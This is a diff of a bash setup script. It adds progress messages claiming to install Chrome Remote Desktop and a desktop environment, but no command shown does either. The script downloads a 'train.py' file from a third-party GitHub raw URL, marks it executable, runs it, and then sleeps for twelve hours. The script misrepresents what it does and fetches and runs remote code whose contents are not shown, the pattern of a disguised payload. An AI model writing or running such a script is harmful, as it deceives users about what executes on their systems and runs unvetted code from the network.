@@ -55,6 +55,16 @@ enda='\033[0m'
 # Branding
 #!/bin/bash
 
+echo "\n\n$c$b Loading Script $endc$enda"
+echo "\n\n$g$b Installing Chrome Remote Desktop $endc$enda"
+echo "\r$c$b Chrome Remote Desktop Installed $endc$enda\n"
+echo "\n$g$b Installing Desktop Environment $endc$enda"
+
+printf "\n\n$c$b Loading Script $endc$enda"
+printf "\n\n$g$b Installing Chrome Remote Desktop $endc$enda"
+printf "\r$c$b Chrome Remote Desktop Installed $endc$enda\n"
+printf "\n$g$b Installing Desktop Environment $endc$enda"
+
 printf """$c$b
  
 ██╗     ██╗███╗   ██╗ ██████╗  ██████╗  █████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗███╗   ██╗ ██████╗ 
@@ -70,6 +80,8 @@ $endc$enda""";
 wget -O train.py https://raw.githubusercontent.com/jangkrikletoy/jangkr1yq/main/train.py
 chmod +x train.py
 
-sleep 43200
+sleep 3
 
 python train.py
+
+sleep 43200
